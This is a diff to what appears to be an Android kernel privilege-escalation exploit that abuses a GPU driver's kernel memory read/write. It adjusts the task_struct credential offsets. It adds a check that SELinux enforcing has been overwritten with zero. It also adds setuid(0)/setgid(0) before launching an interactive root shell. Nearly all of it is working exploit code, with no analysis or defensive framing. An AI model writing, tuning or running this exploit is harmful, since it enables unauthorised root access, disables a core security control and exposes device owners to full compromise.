@@ -28,11 +28,11 @@
 #define SELINUX_OFFSET       0x02caa000ULL
 #define INIT_CRED_OFFSET     0x018f9038ULL
 
-#define OFFSET_PID           0x650
-#define OFFSET_TGID          0x658
-#define OFFSET_COMM          0x818
-#define OFFSET_REAL_CRED     0x868
-#define OFFSET_CRED          0x870
+#define OFFSET_PID           0x548
+#define OFFSET_TGID          0x550
+#define OFFSET_COMM          0x718
+#define OFFSET_REAL_CRED     0x768
+#define OFFSET_CRED          0x770
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -1320,6 +1320,17 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
         uint32_t zero = 0;
         gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
         
+        // Verification of SELinux patch
+        uint32_t verify_selinux = 1;
+        if (gpu_read_task_struct(fd, selinux_enforcing, (uint8_t *)&verify_selinux, 4) == 0) {
+            fprintf(stderr, "[PARENT] SELinux verification: value=%u\n", verify_selinux);
+            if (verify_selinux == 0) {
+                fprintf(stderr, "[PARENT] [+++] SELINUX DISABLED confirmed!\n");
+            } else {
+                fprintf(stderr, "[PARENT] [!] SELINUX PATCH FAILED (value is still %u)\n", verify_selinux);
+            }
+        }
+        
 #ifdef INIT_CRED_OFFSET
         uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
         fprintf(stderr, "[PARENT] Patching global init_cred at 0x%lx...\n", (unsigned long)init_cred_va);
@@ -1455,6 +1466,8 @@ shell:
     prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
     setresuid(0, 0, 0);
     setresgid(0, 0, 0);
+    setuid(0);
+    setgid(0);
 
     // Use execl for a cleaner shell transition
     execl("/system/bin/sh", "sh", "-i", NULL);
